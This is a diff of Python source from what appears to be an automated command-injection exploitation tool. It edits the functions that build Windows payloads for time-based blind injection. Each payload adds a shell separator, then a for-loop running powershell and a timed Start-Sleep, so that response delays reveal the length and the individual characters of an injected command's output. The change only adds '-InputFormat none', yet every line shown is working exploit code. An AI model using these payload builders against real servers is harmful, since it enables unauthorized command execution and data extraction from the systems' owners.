@@ -29,9 +29,9 @@ def decision(separator, TAG, output_length, delay, http_request_method):
   if settings.TARGET_OS == "win":
     if separator == "||" :
       payload = (separator +  " " +
-                 "for /f \"delims=\" %i in ('cmd /c \"powershell.exe write '" + TAG + "'.length\"') "
+                 "for /f \"delims=\" %i in ('cmd /c \"powershell.exe -InputFormat none write '" + TAG + "'.length\"') "
                  "do if %i==" +str(output_length) + " "
-                 "(cmd /c \"powershell.exe Start-Sleep -s " + str(delay) + "\")"
+                 "(cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(delay) + "\")"
                 )
 
     if separator == "&&" :
@@ -41,9 +41,9 @@ def decision(separator, TAG, output_length, delay, http_request_method):
       else:
         ampersand = "&"
       payload = (ampersand + " " + 
-                 "for /f \"delims=\" %i in ('cmd /c \"powershell.exe write '" + TAG + "'.length\"') "
+                 "for /f \"delims=\" %i in ('cmd /c \"powershell.exe -InputFormat none write '" + TAG + "'.length\"') "
                  "do if %i==" +str(output_length) + " "
-                 "(cmd /c \"powershell.exe Start-Sleep -s " + str(delay) + "\")"
+                 "(cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(delay) + "\")"
                 )
 
   else:
@@ -188,7 +188,7 @@ def cmd_execution(separator, cmd, output_length, delay, http_request_method):
                 "for /f \"delims=\" %i in ('cmd /c \"" +
                 cmd + 
                 "\"') do if %i==" +str(output_length) + " "
-                "(cmd /c \"powershell.exe Start-Sleep -s " + str(delay) + "\")"
+                "(cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(delay) + "\")"
                 )
 
     elif separator == "&&" :
@@ -201,7 +201,7 @@ def cmd_execution(separator, cmd, output_length, delay, http_request_method):
                 "for /f \"delims=\" %i in ('cmd /c \"" +
                 cmd + 
                 "\"') do if %i==" +str(output_length) + " "
-                "(cmd /c \"powershell.exe Start-Sleep -s " + str(delay) + "\")"
+                "(cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(delay) + "\")"
                 )
 
   else: 
@@ -339,9 +339,9 @@ def get_char(separator, cmd, num_of_chars, ascii_char, delay, http_request_metho
   if settings.TARGET_OS == "win":
     if separator == "||" :
       payload = (separator +  " " +
-                "for /f \"delims=\" %i in ('cmd /c \"powershell.exe write ([int][char](([string](cmd /c " +
+                "for /f \"delims=\" %i in ('cmd /c \"powershell.exe -InputFormat none write ([int][char](([string](cmd /c " +
                 cmd + ")).trim()).substring(" +str(num_of_chars-1)+ ",1))\"') do if %i==" +str(ascii_char)+
-                " (cmd /c \"powershell.exe Start-Sleep -s " + str(delay + 1) + "\")"
+                " (cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(delay + 1) + "\")"
                 )
 
     elif separator == "&&" :
@@ -351,9 +351,9 @@ def get_char(separator, cmd, num_of_chars, ascii_char, delay, http_request_metho
       else:
         ampersand = "&"
       payload = (ampersand + " " +
-                "for /f \"delims=\" %i in ('cmd /c \"powershell.exe write ([int][char](([string](cmd /c " +
+                "for /f \"delims=\" %i in ('cmd /c \"powershell.exe -InputFormat none write ([int][char](([string](cmd /c " +
                 cmd + ")).trim()).substring(" +str(num_of_chars-1)+ ",1))\"') do if %i==" +str(ascii_char)+
-                " (cmd /c \"powershell.exe Start-Sleep -s " + str(delay + 1) + "\")"
+                " (cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(delay + 1) + "\")"
                 )
 
   else: 
@@ -489,7 +489,7 @@ def fp_result(separator, cmd, num_of_chars, ascii_char, delay, http_request_meth
                 "for /f \"delims=\" %i in ('cmd /c \"" +
                 cmd + 
                 "\"') do if %i==" +str(ascii_char)+
-                " (cmd /c \"powershell.exe Start-Sleep -s " + str(delay) + "\")"
+                " (cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(delay) + "\")"
                 )
 
     elif separator == "&&" :
@@ -502,7 +502,7 @@ def fp_result(separator, cmd, num_of_chars, ascii_char, delay, http_request_meth
                 "for /f \"delims=\" %i in ('cmd /c \"" +
                 cmd + 
                 "\"') do if %i==" +str(ascii_char)+
-                " (cmd /c \"powershell.exe Start-Sleep -s " + str(delay) + "\")"
+                " (cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(delay) + "\")"
                 )
 
   else:
